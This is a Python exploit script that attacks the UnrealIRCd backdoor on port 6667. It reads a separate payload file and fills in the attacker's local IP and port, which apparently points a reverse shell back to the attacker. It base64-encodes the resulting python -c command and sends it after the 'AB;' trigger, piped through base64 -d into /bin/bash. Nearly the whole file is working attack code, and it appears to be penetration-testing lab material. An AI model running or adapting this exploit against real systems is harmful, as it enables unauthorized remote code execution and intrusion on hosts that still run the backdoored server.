import socket
import base64
import argparse


def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('--target-ip', '-t', type=str, help='ip of the target machine', required=True)
    parser.add_argument('--target-port', type=int, help='port of the target machine', default=6667)
    parser.add_argument('--local-ip', '-l', type=str, help='ip of the local machine', required=True)
    parser.add_argument('--local-port', type=int, help='port of the local machine', default=1234)
    
    args = parser.parse_args()
    
    print(vars(args))  
    
    try:
        s = socket.create_connection((args.target_ip, args.target_port))
    except socket.error as error:
        print('Connection to target failed...')
        print(error)
        return
    
    with open('payload.py', 'r') as f:
        script_content = f.read()

    # Remove comments, shebangs, and empty lines
    lines = []
    for line in script_content.split('\n'):
        line = line.split('#')[0].strip()
        if line and not line.startswith('#!'):
            lines.append(line)
    
    script_inline = ';'.join(lines)
    script_inline = script_inline.replace(';;', ';')
    
    # Replace placeholders with actual values
    script_inline = script_inline.replace('LOCALIP', f"{args.local_ip}")
    script_inline = script_inline.replace('\'LOCALPORT\'', f"{args.local_port}")
    
    full_command = f'python -c "{script_inline}"'

    # Base64 encode the ENTIRE command
    encoded = base64.b64encode(full_command.encode()).decode()
    
    print(f"\nPayload command: {full_command}\n")
    print(f"Base64 encoded: {encoded[:50]}...\n")

    # UnrealIRCd backdoor format: AB;command
    # Decode and pipe to /bin/bash (which executes the python -c command)
    payload = f"AB; echo {encoded} | base64 -d | /bin/bash\n"

    print(f"Sending payload ({len(payload)} bytes)...")
    s.sendall(payload.encode())

    try:
        s.settimeout(2)
        data = s.recv(4096)
        if data:
            print(f"Server response: {data.decode(errors='ignore')}")
            print('Exploit sent successfully!')
    except socket.timeout:
        print('No response (payload may have executed)')

    s.close()
    
if __name__ == "__main__":
    main()